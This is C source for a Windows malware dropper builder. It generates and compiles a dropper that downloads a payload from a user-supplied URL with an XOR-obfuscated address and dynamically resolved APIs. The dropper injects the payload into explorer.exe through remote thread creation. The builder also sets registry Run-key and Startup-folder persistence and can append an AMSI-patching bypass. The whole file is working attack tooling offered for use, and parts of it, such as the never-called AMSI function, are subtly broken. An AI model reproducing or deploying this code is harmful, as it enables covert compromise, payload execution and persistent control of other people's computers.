#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <shlobj.h>

#define XOR_KEY 0xAA

void xor_encrypt(char* data, int length) {
    for (int i = 0; i < length; i++) {
        data[i] ^= XOR_KEY;
    }
}

void generate_random_string(char* buffer, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for (int i = 0; i < length; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        buffer[i] = charset[key];
    }
    buffer[length] = '\0';
}

void set_persistence_registry(const char* file_path) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyDropper", 0, REG_SZ, (const BYTE*)file_path, strlen(file_path) + 1);
        RegCloseKey(hKey);
    }
}

void set_persistence_startup(const char* file_path) {
    char startup_folder[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, startup_folder, CSIDL_STARTUP, FALSE)) {
        char startup_file[MAX_PATH];
        sprintf(startup_file, "%s\\%s", startup_folder, "MyDropper.exe");
        CopyFileA(file_path, startup_file, FALSE);
    }
}

void bypass_amsi(FILE *fp) {
    fprintf(fp, 
        "// AMSI Bypass\n"
        "void amsi_bypass() {\n"
        "    HMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\n"
        "    if (hAmsi) {\n"
        "        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, \"AmsiScanBuffer\");\n"
        "        if (pAmsiScanBuffer) {\n"
        "            DWORD oldProtect;\n"
        "            VirtualProtect(pAmsiScanBuffer, sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtect);\n"
        "            *(void**)pAmsiScanBuffer = NULL;\n"
        "            VirtualProtect(pAmsiScanBuffer, sizeof(void*), oldProtect, &oldProtect);\n"
        "        }\n"
        "    }\n"
        "}\n"
    );
}

int main() {
    srand(time(NULL));

    char url[512];
    char output_name[100];
    int persistence_choice, amsi_choice;

    printf("Enter URL to download payload from: ");
    fgets(url, sizeof(url), stdin);
    url[strcspn(url, "\n")] = 0;

    printf("Enter output filename (without .exe): ");
    fgets(output_name, sizeof(output_name), stdin);
    output_name[strcspn(output_name, "\n")] = 0;
    if (strlen(output_name) == 0) {
        strcpy(output_name, "stealth_dropper");
    }

    printf("\nChoose Persistence Options:\n");
    printf("1. Registry Persistence\n");
    printf("2. Startup Folder Persistence\n");
    printf("3. Both\n");
    printf("4. None\n");
    printf("Select an option (1-4): ");
    scanf("%d", &persistence_choice);
    getchar(); // Consume newline character

    printf("\nEnable AMSI Bypass? (1 for Yes, 0 for No): ");
    scanf("%d", &amsi_choice);
    getchar(); // Consume newline character

    xor_encrypt(url, strlen(url));

    FILE *fp = fopen("stealth_dropper.c", "w");
    if (fp == NULL) {
        printf("Error creating dropper source.\n");
        return 1;
    }

    fprintf(fp,
        "#include <windows.h>\n"
        "#include <wininet.h>\n"
        "#pragma comment(lib, \"wininet.lib\")\n"
        "#include <stdio.h>\n"
        "#include <tlhelp32.h>\n"
        "\n"
        "// Decrypt XOR\n"
        "void xor_decrypt(char* data, int length) {\n"
        "    for (int i = 0; i < length; i++) {\n"
        "        data[i] ^= 0xAA;\n"
        "    }\n"
        "}\n"
        "\n"
        "// Manual API resolver\n"
        "FARPROC GetApiAddress(LPCSTR module, LPCSTR function) {\n"
        "    HMODULE hMod = LoadLibraryA(module);\n"
        "    if (!hMod) return NULL;\n"
        "    return GetProcAddress(hMod, function);\n"
        "}\n"
        "\n"
        "// Find target process (explorer.exe)\n"
        "DWORD FindTargetProcess() {\n"
        "    PROCESSENTRY32 pe;\n"
        "    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    pe.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (Process32First(snapshot, &pe)) {\n"
        "        do {\n"
        "            if (lstrcmpi(pe.szExeFile, \"explorer.exe\") == 0) {\n"
        "                CloseHandle(snapshot);\n"
        "                return pe.th32ProcessID;\n"
        "            }\n"
        "        } while (Process32Next(snapshot, &pe));\n"
        "    }\n"
        "    CloseHandle(snapshot);\n"
        "    return 0;\n"
        "}\n"
        "\n"
        "int main() {\n"
        "    char url[] = \"%s\";\n"
        "    xor_decrypt(url, strlen(url));\n"
        "\n"
        "    HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD) = (HINTERNET (WINAPI *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD)) GetApiAddress(\"wininet.dll\", \"InternetOpenA\");\n"
        "    HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR) = (HINTERNET (WINAPI *)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR)) GetApiAddress(\"wininet.dll\", \"InternetOpenUrlA\");\n"
        "    BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD) = (BOOL (WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD)) GetApiAddress(\"wininet.dll\", \"InternetReadFile\");\n"
        "    BOOL (WINAPI *pInternetCloseHandle)(HINTERNET) = (BOOL (WINAPI *)(HINTERNET)) GetApiAddress(\"wininet.dll\", \"InternetCloseHandle\");\n"
        "\n"
        "    HINTERNET hInternet = pInternetOpenA(\"\", 0, NULL, NULL, 0);\n"
        "    HINTERNET hFile = pInternetOpenUrlA(hInternet, url, NULL, 0, 0, 0);\n"
        "\n"
        "    BYTE buffer[4096];\n"
        "    DWORD bytesRead;\n"
        "    HANDLE hHeap = GetProcessHeap();\n"
        "    LPVOID pPayload = HeapAlloc(hHeap, 0, 1);\n"
        "    SIZE_T payloadSize = 0;\n"
        "\n"
        "    while (pInternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {\n"
        "        pPayload = HeapReAlloc(hHeap, 0, pPayload, payloadSize + bytesRead);\n"
        "        memcpy((LPBYTE)pPayload + payloadSize, buffer, bytesRead);\n"
        "        payloadSize += bytesRead;\n"
        "    }\n"
        "\n"
        "    pInternetCloseHandle(hFile);\n"
        "    pInternetCloseHandle(hInternet);\n"
        "\n"
        "    DWORD pid = FindTargetProcess();\n"
        "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
        "    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        "    WriteProcessMemory(hProcess, remoteBuffer, pPayload, payloadSize, NULL);\n"
        "    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\n"
        "\n"
        "    CloseHandle(hThread);\n"
        "    CloseHandle(hProcess);\n"
        "    HeapFree(hHeap, 0, pPayload);\n"
        "\n"
        "    return 0;\n"
        "}\n",
        url
    );

    // Add AMSI bypass if chosen
    if (amsi_choice) {
        bypass_amsi(fp);
    }

    fclose(fp);

    char compile_command[300];
    sprintf(compile_command, "gcc stealth_dropper.c -o %s.exe -lwininet", output_name);

    printf("Compiling stealth_dropper.c... Please wait...\n");
    int compile_result = system(compile_command);
    if (compile_result == 0) {
        printf("Dropper compiled successfully: '%s.exe'.\n", output_name);

        // Set persistence based on user's choice
        if (persistence_choice == 1 || persistence_choice == 3) {
            set_persistence_registry(output_name);
        }
        if (persistence_choice == 2 || persistence_choice == 3) {
            set_persistence_startup(output_name);
        }
    } else {
        printf("Compilation failed.\n");
    }

    return 0;
}
